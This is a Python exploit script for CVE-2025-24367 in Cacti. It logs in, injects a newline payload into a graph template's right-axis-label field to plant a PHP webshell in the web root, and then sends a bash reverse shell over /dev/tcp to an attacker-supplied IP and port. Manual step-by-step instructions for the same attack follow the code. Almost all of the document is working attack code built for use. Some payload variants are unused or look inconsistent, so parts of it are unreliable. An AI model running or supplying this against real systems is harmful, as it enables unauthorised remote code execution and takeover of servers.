#!/usr/bin/env python3
"""
CVE-2025-24367 - Cacti RCE via Graph Template Injection
Affects Cacti <= 1.2.28

This exploit abuses the right_axis_label parameter in graph templates
to inject newlines and create arbitrary PHP files in the web root.
"""

import requests
import re
import sys
import argparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class CactiExploit:
    def __init__(self, url, username, password, lhost, lport, proxy=None):
        self.url = url.rstrip('/')
        self.username = username
        self.password = password
        self.lhost = lhost
        self.lport = lport
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        
    def get_csrf_token(self, html):
        """Extract CSRF token from page"""
        patterns = [
            r'csrfMagicToken\s*=\s*["\']([^"\']+)["\']',
            r'__csrf_magic"\s*value="([^"]+)"',
            r'(sid:[a-f0-9,]+)',
        ]
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None

    def login(self):
        """Login to Cacti"""
        print(f"[*] Logging in as {self.username}...")
        
        # Get login page and CSRF token
        resp = self.session.get(f"{self.url}/index.php")
        csrf = self.get_csrf_token(resp.text)
        
        if not csrf:
            print("[-] Could not find CSRF token")
            return False
        
        # Login
        data = {
            'action': 'login',
            'login_username': self.username,
            'login_password': self.password,
            '__csrf_magic': csrf
        }
        
        resp = self.session.post(f"{self.url}/index.php", data=data, allow_redirects=True)
        
        if 'Invalid User Name/Password' in resp.text:
            print("[-] Login failed!")
            return False
        
        if 'Log Out' in resp.text or 'Logout' in resp.text or 'console' in resp.text.lower():
            print("[+] Login successful!")
            return True
        
        print("[?] Login status unclear, continuing...")
        return True

    def get_graph_template_id(self):
        """Find a suitable graph template to modify"""
        print("[*] Finding graph template...")
        
        resp = self.session.get(f"{self.url}/graph_templates.php")
        csrf = self.get_csrf_token(resp.text)
        
        # Look for template IDs - try common ones first
        # Template 2 is often "Unix - Logged in Users"
        template_ids = re.findall(r'graph_templates\.php\?action=template_edit&id=(\d+)', resp.text)
        
        if template_ids:
            print(f"[+] Found {len(template_ids)} templates")
            return template_ids[0], csrf
        
        print("[-] No templates found")
        return None, csrf

    def create_webshell(self):
        """Inject payload into graph template to create webshell"""
        print("[*] Creating webshell via graph template injection...")
        
        # Get template page
        resp = self.session.get(f"{self.url}/graph_templates.php")
        csrf = self.get_csrf_token(resp.text)
        
        # Payload to create PHP webshell
        # Uses newline injection to break out of RRDTool command
        shell_name = "shell.php"
        
        # The payload creates a simple PHP shell
        payload = f'''test
restore /tmp/test.rrd
create /var/www/html/cacti/{shell_name}
DS:shell:GAUGE:600:U:U
RRA:AVERAGE:0.5:1:600 
'''
        
        # Alternative payload using graph template
        # This injects into right_axis_label field
        webshell_payload = '<?php system($_GET["cmd"]); ?>'
        
        # First, let's try to edit an existing template
        # Get list of templates
        resp = self.session.get(f"{self.url}/graph_templates.php")
        
        # Find template IDs
        template_match = re.search(r'graph_templates\.php\?action=template_edit&id=(\d+)', resp.text)
        
        if template_match:
            template_id = template_match.group(1)
            print(f"[+] Using template ID: {template_id}")
            
            # Get the template edit page
            resp = self.session.get(f"{self.url}/graph_templates.php?action=template_edit&id={template_id}")
            csrf = self.get_csrf_token(resp.text)
            
            # Inject payload via right_axis_label
            # The newline allows us to break out and write a PHP file
            injection = f'''\nrrdtool create /var/www/html/cacti/{shell_name} --step 1 DS:a:GAUGE:120:0:U RRA:LAST:0.5:1:1; echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/cacti/{shell_name}; #'''
            
            data = {
                '__csrf_magic': csrf,
                'action': 'save',
                'save_component_template': '1',
                'id': template_id,
                'hash': '',
                'name': 'Exploited Template',
                'right_axis_label': injection,
            }
            
            resp = self.session.post(f"{self.url}/graph_templates.php", data=data)
            print(f"[*] Payload injected")
            
            return shell_name
        
        return None

    def trigger_rce(self, shell_name):
        """Trigger the webshell to get reverse shell"""
        print(f"[*] Checking for webshell at {self.url}/{shell_name}")
        
        # Check if shell exists
        resp = self.session.get(f"{self.url}/{shell_name}?cmd=id")
        
        if resp.status_code == 200 and ('uid=' in resp.text or 'www-data' in resp.text):
            print(f"[+] Webshell is working!")
            print(f"[+] Response: {resp.text[:200]}")
            
            # Trigger reverse shell
            rev_shell = f"bash -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1'"
            print(f"[*] Sending reverse shell to {self.lhost}:{self.lport}")
            
            try:
                self.session.get(f"{self.url}/{shell_name}", params={'cmd': rev_shell}, timeout=5)
            except:
                pass
            
            return True
        else:
            print(f"[-] Webshell not found or not working (Status: {resp.status_code})")
            return False

    def manual_exploit(self):
        """Provide manual exploitation steps"""
        print("\n" + "="*60)
        print("MANUAL EXPLOITATION STEPS")
        print("="*60)
        print(f"""
1. Login to Cacti at: {self.url}
   Username: {self.username}
   Password: {self.password}

2. Navigate to: Console → Templates → Graph Templates

3. Edit any template (e.g., "Unix - Logged in Users" or template ID 2)

4. In the "Right Axis Label" field, paste this payload:

test
restore
create /var/www/html/cacti/shell.php DS:x:GAUGE:600:U:U RRA:AVERAGE:0.5:1:1

5. Save the template

6. Create a new graph using this template

7. Access webshell at: {self.url}/shell.php?cmd=id

8. For reverse shell, run:
   {self.url}/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/{self.lhost}/{self.lport}%200>%261'

Alternative method - use graph creation:
1. Go to: Console → Create → New Graphs  
2. Select a device and the modified template
3. This will trigger the RRDTool command and create the shell
""")

    def run(self):
        """Main exploit flow"""
        print("="*60)
        print("CVE-2025-24367 - Cacti RCE Exploit")
        print("="*60)
        print(f"[*] Target: {self.url}")
        print(f"[*] Reverse shell: {self.lhost}:{self.lport}")
        print("")
        
        if not self.login():
            return False
        
        shell_name = self.create_webshell()
        
        if shell_name:
            self.trigger_rce(shell_name)
        
        # Always show manual steps as backup
        self.manual_exploit()
        
        return True


def main():
    parser = argparse.ArgumentParser(description='CVE-2025-24367 Cacti RCE Exploit')
    parser.add_argument('-url', required=True, help='Cacti URL (e.g., http://target/cacti)')
    parser.add_argument('-u', '--username', required=True, help='Cacti username')
    parser.add_argument('-p', '--password', required=True, help='Cacti password')
    parser.add_argument('-i', '--ip', required=True, help='Attacker IP for reverse shell')
    parser.add_argument('-l', '--port', required=True, help='Attacker port for reverse shell')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    
    args = parser.parse_args()
    
    print("\n[!] Make sure your listener is running:")
    print(f"    nc -lvnp {args.port}\n")
    
    exploit = CactiExploit(
        url=args.url,
        username=args.username,
        password=args.password,
        lhost=args.ip,
        lport=args.port,
        proxy=args.proxy
    )
    
    exploit.run()


if __name__ == '__main__':
    main()